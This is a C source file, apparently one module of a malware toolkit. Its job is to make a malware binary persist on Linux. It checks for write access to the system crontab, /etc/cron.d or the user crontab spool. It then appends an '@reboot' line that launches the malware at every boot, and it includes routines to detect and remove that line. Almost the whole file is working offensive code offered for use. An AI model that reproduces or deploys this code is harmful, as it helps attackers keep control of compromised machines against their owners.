#pragma region RequiredLibraries

	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>
	#include "../../headers/modules/module.h"
	#include "../../headers/helpers/helpers.h"
	#include "../../headers/errors.h"

#pragma endregion

#pragma region Configuration

	#define        CHECKED_FILES_COUNT               3
	#define        PACKAGES_CRONTAB_FOLDER           "/etc/cron.d"
	#define        USER_CRONTAB_FOLDER               "/var/spool/cron/crontabs"
	#define        SYSTEM_CRONTAB_FILE               "/etc/crontab"

	#define        RUN_COMMAND_BUFFER_SIZE           64
	#define        RUN_COMMAND_FORMAT                "@reboot %s\n"

#pragma endregion

#pragma region GlobalVariables

	char *checked_files[CHECKED_FILES_COUNT];
	char run_command_buffer[RUN_COMMAND_BUFFER_SIZE];
	int exploitable_file_index = -1;

#pragma endregion

#pragma region SharedObjectEvents

void __attribute__ ((constructor)) on_dlopen(void){

	// Generate a part of checked files
	copy_string(checked_files + __COUNTER__, SYSTEM_CRONTAB_FILE, 0);

}

void __attribute__ ((destructor)) on_dlclose(void){

	int i;

	for (i = 0; i < CHECKED_FILES_COUNT; i++){
		free(checked_files[i]);
	}

}

#pragma endregion

#pragma region ModuleMethods

extern int is_compatible(ENVIRONMENT *env){

	int i, ret_val;

	// Generate the rest of the checked files
	concat_path_with_filename(checked_files + __COUNTER__, PACKAGES_CRONTAB_FOLDER, env->fake_name);
	concat_path_with_filename(checked_files + __COUNTER__, USER_CRONTAB_FOLDER, env->fake_name);

	// If root, then the exploit can be executed
	if (env->is_root){
		exploitable_file_index = 0;
		return 1;
	}

	for (i = 0; i < CHECKED_FILES_COUNT; i++){

		// Check the privileges for the current file
		ret_val = has_privilege(checked_files[i], WRITE);
		if (ret_val >= 0){
			exploitable_file_index = i;
			break;
		}

	}

	// Return
	return ret_val;

}

extern int exploit(ENVIRONMENT *env){

	FILE *opened_file;

	if (exploitable_file_index == -1)
		is_compatible(env);

	// Compose the command that will be appended
	sprintf(run_command_buffer, RUN_COMMAND_FORMAT, env->malware_path);

	// Add line to file
	opened_file = fopen(checked_files[exploitable_file_index], "a");
	fputs(run_command_buffer, opened_file);
	fclose(opened_file);

	// Return
	return 0;

}

extern int is_installed(ENVIRONMENT *env){

	char *content = NULL;
	int ret_val = 0;

	// If the index is not already setted, call the method
	if (exploitable_file_index == -1)
		is_compatible(env);

	// Get file content
	if (get_file_content(checked_files[exploitable_file_index], &content) >= 0){

		// Verify if the run command is present
		if (strstr(content, run_command_buffer) != NULL){
			ret_val = 1;
		}

		free(content);
		content = NULL;

	}

	// Return
	return ret_val;

}

extern int delete_installed(ENVIRONMENT *env){

	char *content = NULL;

	// If the index is not already setted, call the method
	if (exploitable_file_index == -1)
		is_compatible(env);

	if (get_file_content(checked_files[exploitable_file_index], &content) >= 0){

		// Replace the occurences of the run command
		remove_all_substring_occurences(content, run_command_buffer);
		create_file(checked_files[exploitable_file_index], content);

		free(content);
		content = NULL;

	}

	// Return
	return 0;

}

#pragma endregion